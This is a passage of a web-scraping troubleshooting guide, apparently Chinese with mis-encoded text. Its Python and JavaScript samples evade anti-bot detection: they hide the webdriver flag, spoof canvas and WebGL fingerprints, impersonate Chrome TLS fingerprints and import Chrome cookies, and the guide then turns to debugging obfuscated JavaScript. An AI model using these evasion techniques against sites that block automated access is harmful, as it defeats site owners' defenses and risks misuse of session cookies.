        <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;--disable-blink-features=AutomationControlled&#39;</span><span class="p">]</span>
    <span class="p">)</span>

    <span class="n">context</span> <span class="o">=</span> <span class="n">browser</span><span class="o">.</span><span class="n">new_context</span><span class="p">(</span>
        <span class="n">viewport</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;width&#39;</span><span class="p">:</span> <span class="mi">1920</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span><span class="p">:</span> <span class="mi">1080</span><span class="p">},</span>
        <span class="n">user_agent</span><span class="o">=</span><span class="s1">&#39;Mozilla/5.0 ...&#39;</span>
    <span class="p">)</span>

    <span class="n">page</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>

    <span class="c1"># æ·»åŠ  stealth è„šæœ¬</span>
    <span class="n">page</span><span class="o">.</span><span class="n">add_init_script</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        Object.defineProperty(navigator, &#39;webdriver&#39;, {</span>
<span class="s2">            get: () =&gt; undefined</span>
<span class="s2">        });</span>
<span class="s2">        Object.defineProperty(navigator, &#39;plugins&#39;, {</span>
<span class="s2">            get: () =&gt; [1, 2, 3, 4, 5]</span>
<span class="s2">        });</span>
<span class="s2">    &quot;&quot;&quot;</span><span class="p">)</span>

    <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="n">page</span><span class="o">.</span><span class="n">wait_for_load_state</span><span class="p">(</span><span class="s1">&#39;networkidle&#39;</span><span class="p">)</span>

    <span class="n">content</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">content</span><span class="p">()</span>
    <span class="n">browser</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="cookiesession-è·Ÿè¸ª">Cookie/Session è·Ÿè¸ª</h2>

      <h3 id="é—®é¢˜è¡¨ç°-6">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>éœ€è¦ä¿æŒç™»å½•çŠ¶æ€</li>
        <li>è·¨é¡µé¢è¯·æ±‚å¤±è´¥</li>
        <li>Session è¿‡æœŸ</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-6">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ä½¿ç”¨-session-å¯¹è±¡">1. ä½¿ç”¨ Session å¯¹è±¡</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="c1"># ç™»å½•</span>
<span class="n">login_data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span>
    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;pass&#39;</span>
<span class="p">}</span>
<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://example.com/login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">login_data</span><span class="p">)</span>

<span class="c1"># åç»­è¯·æ±‚è‡ªåŠ¨æºå¸¦ Cookie</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com/protected-page&#39;</span><span class="p">)</span>

<span class="c1"># ä¿å­˜ Session</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;session.pkl&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>

<span class="c1"># åŠ è½½ Session</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;session.pkl&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">))</span>
</code></pre>
      </div>

      <h4 id="2-æµè§ˆå™¨-cookie-å¯¼å…¥">2. æµè§ˆå™¨ Cookie å¯¼å…¥</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">browser_cookie3</span>

<span class="c1"># ä» Chrome è·å– Cookie</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="n">browser_cookie3</span><span class="o">.</span><span class="n">chrome</span><span class="p">(</span><span class="n">domain_name</span><span class="o">=</span><span class="s1">&#39;example.com&#39;</span><span class="p">)</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">session</span><span class="o">.</span><span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="tls-æŒ‡çº¹è¯†åˆ«">TLS æŒ‡çº¹è¯†åˆ«</h2>

      <h3 id="é—®é¢˜è¡¨ç°-7">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>å³ä½¿ Headers å®Œå…¨ç›¸åŒä»è¢«æ£€æµ‹</li>
        <li>åŸºäº JA3 æŒ‡çº¹è¯†åˆ«</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-7">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ä½¿ç”¨-curl_cffi">1. ä½¿ç”¨ curl_cffi</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">curl_cffi</span><span class="w"> </span><span class="kn">import</span> <span class="n">requests</span>

<span class="c1"># æ¨¡æ‹Ÿ Chrome çš„ TLS æŒ‡çº¹</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
    <span class="n">url</span><span class="p">,</span>
    <span class="n">impersonate</span><span class="o">=</span><span class="s2">&quot;chrome110&quot;</span>
<span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨çœŸå®æµè§ˆå™¨">2. ä½¿ç”¨çœŸå®æµè§ˆå™¨</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Playwright å’Œ Selenium ä½¿ç”¨çœŸå®æµè§ˆå™¨,</span>
<span class="c1"># è‡ªç„¶å…·æœ‰çœŸå®çš„ TLS æŒ‡çº¹</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">playwright.sync_api</span><span class="w"> </span><span class="kn">import</span> <span class="n">sync_playwright</span>

<span class="k">with</span> <span class="n">sync_playwright</span><span class="p">()</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
    <span class="n">browser</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">chromium</span><span class="o">.</span><span class="n">launch</span><span class="p">()</span>
    <span class="n">page</span> <span class="o">=</span> <span class="n">browser</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>
    <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">content</span><span class="p">()</span>
    <span class="n">browser</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="websocket-åçˆ¬">WebSocket åçˆ¬</h2>

      <h3 id="é—®é¢˜è¡¨ç°-8">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>å®æ—¶æ•°æ®é€šè¿‡ WebSocket ä¼ è¾“</li>
        <li>éœ€è¦ç»´æŒé•¿è¿æ¥</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-8">è§£å†³æ–¹æ¡ˆ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">websocket</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">def</span><span class="w"> </span><span class="nf">on_message</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ¥æ”¶æ¶ˆæ¯å›è°ƒ&quot;&quot;&quot;</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Received: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">on_error</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="n">error</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error: </span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">on_close</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="n">close_status_code</span><span class="p">,</span> <span class="n">close_msg</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Connection closed&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">on_open</span><span class="p">(</span><span class="n">ws</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è¿æ¥å»ºç«‹åå‘é€è®¢é˜…æ¶ˆæ¯&quot;&quot;&quot;</span>
    <span class="n">subscribe_msg</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
        <span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;subscribe&quot;</span><span class="p">,</span>
        <span class="s2">&quot;channel&quot;</span><span class="p">:</span> <span class="s2">&quot;data_feed&quot;</span>
    <span class="p">})</span>
    <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subscribe_msg</span><span class="p">)</span>

<span class="c1"># åˆ›å»º WebSocket è¿æ¥</span>
<span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="o">.</span><span class="n">WebSocketApp</span><span class="p">(</span>
    <span class="s2">&quot;wss://example.com/ws&quot;</span><span class="p">,</span>
    <span class="n">on_open</span><span class="o">=</span><span class="n">on_open</span><span class="p">,</span>
    <span class="n">on_message</span><span class="o">=</span><span class="n">on_message</span><span class="p">,</span>
    <span class="n">on_error</span><span class="o">=</span><span class="n">on_error</span><span class="p">,</span>
    <span class="n">on_close</span><span class="o">=</span><span class="n">on_close</span><span class="p">,</span>
    <span class="n">header</span><span class="o">=</span><span class="p">{</span>
        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 ...&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Origin&quot;</span><span class="p">:</span> <span class="s2">&quot;https://example.com&quot;</span>
    <span class="p">}</span>
<span class="p">)</span>

<span class="n">ws</span><span class="o">.</span><span class="n">run_forever</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è®¾å¤‡æŒ‡çº¹è¯†åˆ«">è®¾å¤‡æŒ‡çº¹è¯†åˆ«</h2>

      <h3 id="é—®é¢˜è¡¨ç°-9">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>Canvas æŒ‡çº¹</li>
        <li>WebGL æŒ‡çº¹</li>
        <li>æµè§ˆå™¨ç‰¹å¾è¯†åˆ«</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-9">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ä½¿ç”¨æŒ‡çº¹æ¬ºéª—">1. ä½¿ç”¨æŒ‡çº¹æ¬ºéª—</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">playwright.sync_api</span><span class="w"> </span><span class="kn">import</span> <span class="n">sync_playwright</span>

<span class="k">with</span> <span class="n">sync_playwright</span><span class="p">()</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
    <span class="n">browser</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">chromium</span><span class="o">.</span><span class="n">launch</span><span class="p">()</span>
    <span class="n">context</span> <span class="o">=</span> <span class="n">browser</span><span class="o">.</span><span class="n">new_context</span><span class="p">()</span>

    <span class="c1"># æ³¨å…¥åæŒ‡çº¹è„šæœ¬</span>
    <span class="n">context</span><span class="o">.</span><span class="n">add_init_script</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        // æ¬ºéª— Canvas æŒ‡çº¹</span>
<span class="s2">        const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;</span>
<span class="s2">        HTMLCanvasElement.prototype.toDataURL = function() {</span>
<span class="s2">            const context = this.getContext(&#39;2d&#39;);</span>
<span class="s2">            const imageData = context.getImageData(0, 0, this.width, this.height);</span>
<span class="s2">            // æ·»åŠ å™ªç‚¹</span>
<span class="s2">            for (let i = 0; i &lt; imageData.data.length; i += 4) {</span>
<span class="s2">                imageData.data[i] += Math.random() * 10 - 5;</span>
<span class="s2">            }</span>
<span class="s2">            context.putImageData(imageData, 0, 0);</span>
<span class="s2">            return originalToDataURL.apply(this, arguments);</span>
<span class="s2">        };</span>

<span class="s2">        // æ¬ºéª— WebGL æŒ‡çº¹</span>
<span class="s2">        const getParameter = WebGLRenderingContext.prototype.getParameter;</span>
<span class="s2">        WebGLRenderingContext.prototype.getParameter = function(parameter) {</span>
<span class="s2">            if (parameter === 37445) {</span>
<span class="s2">                return &#39;Intel Inc.&#39;;</span>
<span class="s2">            }</span>
<span class="s2">            if (parameter === 37446) {</span>
<span class="s2">                return &#39;Intel Iris OpenGL Engine&#39;;</span>
<span class="s2">            }</span>
<span class="s2">            return getParameter.apply(this, arguments);</span>
<span class="s2">        };</span>
<span class="s2">    &quot;&quot;&quot;</span><span class="p">)</span>

    <span class="n">page</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>
    <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="n">browser</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹</a></li>
        <li><a href="#04-Advanced-Recipes-captcha-bypass">CAPTCHA ç»•è¿‡</a></li>
        <li><a href="#04-Advanced-Recipes-anti-scraping-deep-dive">åçˆ¬è™«æ·±åº¦å‰–æ</a></li>
        <li><a href="#04-Advanced-Recipes-tls-fingerprinting">TLS æŒ‡çº¹</a></li>
      </ul>

    </div>

    <div class="section" id="10-Troubleshooting-javascript-debugging">
      <h2>77. JavaScript Debugging</h2>
      <h1 id="javascript-è°ƒè¯•é—®é¢˜">JavaScript è°ƒè¯•é—®é¢˜</h1>

      <p>JavaScript é€†å‘å’Œè°ƒè¯•ä¸­çš„å¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚</p>

      <hr />

      <h2 id="æ–­ç‚¹ä¸ç”Ÿæ•ˆ">æ–­ç‚¹ä¸ç”Ÿæ•ˆ</h2>

      <h3 id="é—®é¢˜è¡¨ç°">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>è®¾ç½®æ–­ç‚¹åä»£ç ä¸æš‚åœ</li>
        <li>æ–­ç‚¹æ˜¾ç¤ºç°è‰²</li>
        <li>ä»£ç è·³è¿‡æ–­ç‚¹ç»§ç»­æ‰§è¡Œ</li>
      </ul>

      <h3 id="åŸå› åˆ†æ">åŸå› åˆ†æ</h3>

      <ol>
        <li>ä»£ç å·²è¢«ä¼˜åŒ–æˆ–å†…è”</li>
        <li>Source Map ä¸åŒ¹é…</li>
        <li>å¼‚æ­¥ä»£ç æ‰§è¡Œæ—¶æœºé—®é¢˜</li>
        <li>ä»£ç è¢«åŠ¨æ€ç”Ÿæˆ</li>
      </ol>

      <h3 id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ä½¿ç”¨-debugger-è¯­å¥">1. ä½¿ç”¨ debugger è¯­å¥</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ä»£ç ä¸­ç›´æ¥æ’å…¥</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">suspiciousFunction</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// å¼ºåˆ¶æš‚åœ</span>
<span class="w">    </span><span class="c1">// ... åç»­ä»£ç </span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>é€šè¿‡ Hook æ³¨å…¥</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨æ§åˆ¶å°æ‰§è¡Œ</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">someFunction</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">someFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// åœ¨è°ƒç”¨å‰æš‚åœ</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨æ¡ä»¶æ–­ç‚¹">2. ä½¿ç”¨æ¡ä»¶æ–­ç‚¹</h4>

      <p>åœ¨ DevTools ä¸­å³é”®æ–­ç‚¹ â†’ Edit breakpoint:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åªæœ‰å½“æ¡ä»¶æ»¡è¶³æ—¶æ‰æš‚åœ</span>
<span class="nx">userId</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">12345</span>

<span class="c1">// æˆ–ä½¿ç”¨è¡¨è¾¾å¼</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Value:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">someVar</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="kc">false</span>
</code></pre>
      </div>

      <h4 id="3-dom-æ–­ç‚¹">3. DOM æ–­ç‚¹</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç›‘å¬ DOM ä¿®æ”¹</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">element</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;#target&#39;</span><span class="p">);</span>

<span class="c1">// Break on: subtree modifications, attribute modifications, node removal</span>
</code></pre>
      </div>

      <h4 id="4-event-listener-æ–­ç‚¹">4. Event Listener æ–­ç‚¹</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// DevTools â†’ Sources â†’ Event Listener Breakpoints</span>
<span class="c1">// å‹¾é€‰ç›¸å…³äº‹ä»¶ (å¦‚ click, xhr, timeout)</span>

<span class="c1">// æˆ–è€…ä»£ç ä¸­ç›‘å¬</span>
<span class="nx">monitorEvents</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;click&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ— æ³•æŸ¥çœ‹å˜é‡å€¼">æ— æ³•æŸ¥çœ‹å˜é‡å€¼</h2>

      <h3 id="é—®é¢˜è¡¨ç°-2">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>å˜é‡æ˜¾ç¤º <code>undefined</code> æˆ– <code>&lt;unavailable&gt;</code></li>
        <li>Scope ä¸­çœ‹ä¸åˆ°å˜é‡</li>
        <li>é—­åŒ…å˜é‡æ— æ³•è®¿é—®</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-2">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-æ£€æŸ¥ä½œç”¨åŸŸ">1. æ£€æŸ¥ä½œç”¨åŸŸ</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Console ä¸­ï¼Œä½¿ç”¨æ­£ç¡®çš„ä½œç”¨åŸŸ</span>
<span class="c1">// å¦‚æœåœ¨å‡½æ•°å†…éƒ¨æ–­ç‚¹:</span>

<span class="c1">// âŒ é”™è¯¯ - å…¨å±€ä½œç”¨åŸŸ</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">localVar</span><span class="p">);</span><span class="w">  </span><span class="c1">// undefined</span>

<span class="c1">// âœ… æ­£ç¡® - å½“å‰ä½œç”¨åŸŸå¯è§</span>
<span class="c1">// ç›´æ¥åœ¨ Scope é¢æ¿æŸ¥çœ‹ï¼Œæˆ–åœ¨ Console è¾“å…¥å˜é‡å</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨-watch-è¡¨è¾¾å¼">2. ä½¿ç”¨ Watch è¡¨è¾¾å¼</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Sources â†’ Watch â†’ Add expression</span>

<span class="c1">// æ·»åŠ å¤æ‚è¡¨è¾¾å¼</span>
<span class="k">this</span><span class="p">.</span><span class="nx">userData</span><span class="p">.</span><span class="nx">profile</span><span class="p">.</span><span class="nx">name</span>
<span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">config</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="k">this</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-ä½¿ç”¨-consoledir-æŸ¥çœ‹å¯¹è±¡">3. ä½¿ç”¨ console.dir æŸ¥çœ‹å¯¹è±¡</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æŸ¥çœ‹å¯¹è±¡å®Œæ•´ç»“æ„</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">dir</span><span class="p">(</span><span class="nx">complexObject</span><span class="p">);</span>

<span class="c1">// æŸ¥çœ‹åŸå‹é“¾</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">getPrototypeOf</span><span class="p">(</span><span class="nx">obj</span><span class="p">));</span>

<span class="c1">// æŸ¥çœ‹æ‰€æœ‰å±æ€§</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyNames</span><span class="p">(</span><span class="nx">obj</span><span class="p">));</span>
</code></pre>
      </div>

      <h4 id="4-ä¸´æ—¶ä¿®æ”¹ä»£ç ">4. ä¸´æ—¶ä¿®æ”¹ä»£ç </h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½¿ç”¨ Overrides åŠŸèƒ½</span>
<span class="c1">// DevTools â†’ Sources â†’ Overrides â†’ Enable Local Overrides</span>

<span class="c1">// åœ¨ä»£ç ä¸­æ·»åŠ æ—¥å¿—</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;encrypt input:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span><span class="w">  </span><span class="c1">// æ·»åŠ è¿™è¡Œ</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">doEncrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;encrypt output:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span><span class="w">  </span><span class="c1">// æ·»åŠ è¿™è¡Œ</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="source-map-é—®é¢˜">Source Map é—®é¢˜</h2>

      <h3 id="é—®é¢˜è¡¨ç°-3">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>ä»£ç æ˜¾ç¤ºæ··æ·†åçš„ç‰ˆæœ¬</li>
        <li>æ— æ³•çœ‹åˆ°åŸå§‹ä»£ç </li>
        <li>Source Map åŠ è½½å¤±è´¥</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-3">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-æ‰‹åŠ¨åŠ è½½-source-map">1. æ‰‹åŠ¨åŠ è½½ Source Map</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å¦‚æœæœ‰ .map æ–‡ä»¶</span>
<span class="c1">//# sourceMappingURL=app.js.map</span>

<span class="c1">// åœ¨ DevTools â†’ Sources å³é”®æ–‡ä»¶ â†’ &quot;Add source map&quot;</span>
<span class="c1">// è¾“å…¥ Source Map URL</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨åœ¨çº¿å·¥å…·">2. ä½¿ç”¨åœ¨çº¿å·¥å…·</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ source-map-cli è¿˜åŸ</span>
npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>source-map-cli

<span class="c1"># æŸ¥çœ‹åŸå§‹ä½ç½®</span>
source-map<span class="w"> </span>resolve<span class="w"> </span>app.js.map<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">100</span>
</code></pre>
      </div>

      <h4 id="3-æ ¼å¼åŒ–ä»£ç ">3. æ ¼å¼åŒ–ä»£ç </h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// DevTools â†’ Sources â†’ ç‚¹å‡» {} æŒ‰é’® (Pretty print)</span>
<span class="c1">// æˆ–å¿«æ·é”®: Ctrl + Shift + P â†’ &quot;Pretty print&quot;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ··æ·†ä»£ç è°ƒè¯•">æ··æ·†ä»£ç è°ƒè¯•</h2>

      <h3 id="é—®é¢˜è¡¨ç°-4">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>å˜é‡åå¦‚ <code>_0x1a2b</code>, <code>a</code>, <code>b</code></li>
        <li>ä»£ç é€»è¾‘éš¾ä»¥ç†è§£</li>
        <li>å¤§é‡æ— æ„ä¹‰ä»£ç </li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-4">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ä½¿ç”¨-ast-å·¥å…·è¿˜åŸ">1. ä½¿ç”¨ AST å·¥å…·è¿˜åŸ</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½¿ç”¨ Babel è¿˜åŸ</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/parser&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/traverse&#39;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">generate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/generator&#39;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`/* æ··æ·†åçš„ä»£ç  */`</span><span class="p">;</span>
